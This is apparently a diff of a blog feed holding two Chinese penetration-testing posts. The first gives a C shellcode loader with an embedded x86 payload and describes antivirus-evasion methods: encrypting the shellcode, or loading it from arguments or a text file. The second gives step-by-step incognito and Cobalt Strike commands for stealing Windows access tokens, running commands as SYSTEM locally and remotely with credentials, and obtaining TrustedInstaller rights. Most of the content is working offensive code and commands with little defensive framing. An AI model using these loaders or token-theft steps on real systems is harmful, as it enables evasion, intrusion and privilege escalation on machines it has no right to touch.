-    <content type="html"><![CDATA[<p>C的加载器有好几种，直接把shellcode放进源码中能够过静态层面的查杀，但是运行时会被查杀；</p><p>如最常用的加载器：</p><pre><code>#include &lt;windows.h&gt;#include &lt;stdio.h&gt;#pragma comment(linker,&quot;/subsystem:\&quot;windows\&quot; /entry:\&quot;mainCRTStartup\&quot;&quot;)unsigned char shellcode[] =&quot;\x31\xdb\x64\x8b\x7b\x30\x8b\x7f&quot;&quot;\x0c\x8b\x7f\x1c\x8b\x47\x08\x8b&quot;&quot;\x77\x20\x8b\x3f\x80\x7e\x0c\x33&quot;&quot;\x75\xf2\x89\xc7\x03\x78\x3c\x8b&quot;&quot;\x57\x78\x01\xc2\x8b\x7a\x20\x01&quot;&quot;\xc7\x89\xdd\x8b\x34\xaf\x01\xc6&quot;&quot;\x45\x81\x3e\x43\x72\x65\x61\x75&quot;&quot;\xf2\x81\x7e\x08\x6f\x63\x65\x73&quot;&quot;\x75\xe9\x8b\x7a\x24\x01\xc7\x66&quot;&quot;\x8b\x2c\x6f\x8b\x7a\x1c\x01\xc7&quot;&quot;\x8b\x7c\xaf\xfc\x01\xc7\x89\xd9&quot;&quot;\xb1\xff\x53\xe2\xfd\x68\x63\x61&quot;&quot;\x6c\x63\x89\xe2\x52\x52\x53\x53&quot;&quot;\x53\x53\x53\x53\x52\x53\xff\xd7&quot;;void main(){    ((void(*)(void))&amp;shellcode)();}</code></pre><p>解决方法1：加密shellcode再解密运行（最后用一些比较偏的加密算法）</p><p>解决方法2：pyaload分离<br>[1]借助main的入口参数，用户直接输shellcode</p><p>[2]从txt文件中加载shellcode</p><p>这个当初比较头疼，因为C语言这方面确实不大行，从txt读取shellcode的时候出现问题;记录如下：</p><ul><li>获取txt中shellcode长度，申请内存空间</li></ul><ul><li>.使用fread读取txt为字符串，加载难以识别出shellcode    </li></ul><ul><li>.fscanf判定shellcode分割符需要进行转义(这点是乔哥解决的，我乔哥还是强啊)</li></ul>]]></content>
-    
-    <summary type="html">
-    
-      
-      
-        &lt;p&gt;C的加载器有好几种，直接把shellcode放进源码中能够过静态层面的查杀，但是运行时会被查杀；&lt;/p&gt;
-&lt;p&gt;如最常用的加载器：&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;#include &amp;lt;windows.h&amp;gt;
-#include &amp;lt;stdio.h&amp;gt;
-#pra
-      
-    
-    </summary>
-    
-    
-    
-  </entry>
-  
-  <entry>
-    <title>incognito Stealing Windows Access Tokens</title>
-    <link href="https://github.com/2020/04/26/incognito-Stealing-Windows-Access-Tokens/"/>
-    <id>https://github.com/2020/04/26/incognito-Stealing-Windows-Access-Tokens/</id>
-    <published>2020-04-26T02:18:58.000Z</published>
-    <updated>2020-04-26T02:48:39.678Z</updated>
-    
-    <content type="html"><![CDATA[<p>使用incognito可以窃取令牌以任意用户身份执行任意命令或payload</p><p>得到当前管理员权限，域管理员帐户已登录到该计算机，则可能可以简单地从中读取域管理员的访问令牌<br>列出域管理组成员：</p><pre><code>net groups &quot;Domain Admins&quot; /domain</code></pre><p><strong>0x01、ACCESS TOKEN(访问令牌)：</strong></p><p>当用户登录时，Windows会为此用户创建访问令牌，用于存储用户的身份和特权</p><p>Token在用户创建进程或者线程时会被使用，那么这些进程或者线程能够访问哪些资源取决于当前令牌</p><p><strong>0x02、令牌类型</strong></p><p>Delegation token(授权令牌):用于交互会话登录(例如本地用户直接登录、远程桌面登录)</p><p>Impersonation token(模拟令牌):用于非交互登录(利用net use访问共享文件夹)</p><p>这两种令牌,都会在系统重启以后被清除, 否则将会一直驻留在内存中,而授权令牌则会在用户注销以后自动被转为模拟令牌,但仍然可利用。</p><p><strong>0x03、本地和远程的基本用法</strong></p><p><strong>本地：</strong> </p><p>查看 token：</p><p><code>incognito.exe list_tokens–u</code> </p><p>获取到已注销用户 int18\administrator的token,盗取token 执行命令： </p><pre><code>incognito.exe execute -c &quot;int18\administrator&quot; calc.exe </code></pre><p><strong>远程：</strong></p><pre><code>incognito -h 10.101.112.213 -u employee2012\administrator -p abc@123  list_tokens -u</code></pre><p><img src="1.png" alt=""></p><pre><code>incognito -h 10.101.112.213 -u employee2012\administrator -p abc@123  execute -c &quot;NT AUTHORITY\SYSTEM&quot; cmd.exe </code></pre><p><img src="2.png" alt=""></p><p><strong>0x04、提权、降权、伪造（以本地示例)</strong></p><pre><code>incognito execute -c &quot;NT AUTHORITYSYSTEM&quot; cmd.exe #提权至system incognito execute -c &quot;int\test&quot; cmd.exe #降权至当前 test 用户 incognito execute -c &quot;int\test1&quot; cmd.exe #伪造test1 用户 </code></pre><p>0x03、获取TrustedInstaller 权限（修改系统文件）<br>管理员、System 均无法修改系统文件、需 TrustedInstaller 权限<br><a href="https://tyranidslair.blogspot.nl/2017/08/the-art-of-becoming-trustedinstaller.html" target="_blank" rel="noopener">借用 TrustedInstaller.exe 的 token 创建子进程，这样子进程就有了 TrustedInstaller 权限</a></p><p>在CS下获取TrustedInstaller </p><blockquote><p>shell sc strat TrustedInstaller </p></blockquote><blockquote><p>steal token  1700 ##ps查看TrustedInstaller进程号</p></blockquote><blockquote><p>shell whoami /groups</p></blockquote><p>链接：</p><p><a href="https://3gstudent.github.io/3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-Token%E7%AA%83%E5%8F%96%E4%B8%8E%E5%88%A9%E7%94%A8/" target="_blank" rel="noopener">https://3gstudent.github.io/3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-Token%E7%AA%83%E5%8F%96%E4%B8%8E%E5%88%A9%E7%94%A8/</a></p><p><a href="https://blog.csdn.net/qq_36374896/article/details/84261516" target="_blank" rel="noopener">https://blog.csdn.net/qq_36374896/article/details/84261516</a>  </p><p><a href="https://tyranidslair.blogspot.nl/2017/08/the-art-of-becoming-trustedinstaller.html" target="_blank" rel="noopener">https://tyranidslair.blogspot.nl/2017/08/the-art-of-becoming-trustedinstaller.html</a> </p><p><a href="https://www.jianshu.com/p/907c6aab6fd0" target="_blank" rel="noopener">https://www.jianshu.com/p/907c6aab6fd0</a></p><p><a href="http://paper.vulsee.com/Micro8/%E7%AC%AC%E4%B8%80%E7%99%BE%E4%B8%80%E5%8D%81%E8%AF%BE%EF%BC%9A%E7%AA%83%E5%8F%96%2C%E4%BC%AA%E9%80%A0%E6%A8%A1%E6%8B%9F%E5%90%84%E7%A7%8Dwindows%E8%AE%BF%E9%97%AE%E4%BB%A4%E7%89%8C%5Btoken%E5%88%A9%E7%94%A8%5D.pdf" target="_blank" rel="noopener">http://paper.vulsee.com/Micro8/%E7%AC%AC%E4%B8%80%E7%99%BE%E4%B8%80%E5%8D%81%E8%AF%BE%EF%BC%9A%E7%AA%83%E5%8F%96%2C%E4%BC%AA%E9%80%A0%E6%A8%A1%E6%8B%9F%E5%90%84%E7%A7%8Dwindows%E8%AE%BF%E9%97%AE%E4%BB%A4%E7%89%8C%5Btoken%E5%88%A9%E7%94%A8%5D.pdf</a></p>]]></content>
-    
-    <summary type="html">
-    
-      
-      
-        &lt;p&gt;使用incognito可以窃取令牌以任意用户身份执行任意命令或payload&lt;/p&gt;
-&lt;p&gt;得到当前管理员权限，域管理员帐户已登录到该计算机，则可能可以简单地从中读取域管理员的访问令牌&lt;br&gt;列出域管理组成员：&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;net groups &amp;quot
       
     
     </summary>
